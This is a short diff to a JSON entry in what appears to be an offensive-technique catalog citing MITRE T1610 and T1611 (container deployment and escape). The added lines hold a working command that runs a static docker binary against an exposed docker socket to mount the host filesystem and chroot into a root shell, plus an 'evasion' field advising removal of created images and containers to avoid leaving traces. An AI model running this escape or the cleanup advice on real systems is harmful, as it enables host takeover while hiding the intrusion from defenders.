@@ -95,6 +95,13 @@
       "HTB M25",
       "MITRE T1610",
       "MITRE T1611"
-    ]
-  }
+    ],
+    "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+  },
+  "variations": [
+    {
+      "label": "Use a static docker binary against the socket",
+      "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    }
+  ]
 }
